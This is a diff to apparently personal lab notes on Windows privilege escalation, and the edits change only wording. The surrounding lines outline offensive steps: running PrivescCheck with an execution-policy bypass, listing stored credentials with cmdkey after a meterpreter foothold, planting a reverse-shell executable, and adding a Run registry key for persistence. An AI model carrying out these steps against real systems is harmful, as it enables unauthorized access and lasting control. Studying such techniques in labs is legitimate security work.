@@ -63,8 +63,8 @@ Which function in PrivescCheck helps in identifying user privileges that could p
 C:> powershell.exe -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 C:> runas.exe /user:administrator cmd (Calling cmd with administrator privilege from PowerShell)
 ___________________________________________________________________________________________________________________________________________________________________________________________
-Use cmdkey to get reverse shell (administrator)
-------------------------------------------------
+Privilege escalation from credential manager by Using cmdkey 
+-------------------------------------------------------------
 1. Get windows Student user with hta_server (meterpreter)
 2. meterpreter > shell
 C:> cmdkey /list
@@ -164,13 +164,13 @@ Access : NT AUTHORITY\SYSTEM Allow  FullControl
          BUILTIN\Administrators Allow  FullControl
          BUILTIN\Users Allow  ReadAndExecute, Synchronize
 
-5. Builtin\all users has read and execute > so that create a folder > inside that folder create new .exe file with reverse shell
+5. Builtin\all users has only read and execute ( so that cannot do anything in folder ) > create a folder in any location > inside that folder create new .exe file with reverse shell
 
-6. Caputer with msfconsole, don't forget to set payload windows/meterpreter/reverse_tcp
+6. Capture with msfconsole, don't forget to set payload windows/meterpreter/reverse_tcp
 
 7. Create a string value under "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" > string value is the directory where program.exe have
 
-8. When the administrator is shutdown and restart again > hfs.exe starts > program.exe runs > we got a reverse shell
+8. When the administrator account is shutdown and restart again > hfs.exe starts > program.exe runs > we got a reverse shell
 
 in powershell > shutdown /l > it is restart
 ________________________________________________________________________________________________________________________________________________________________________
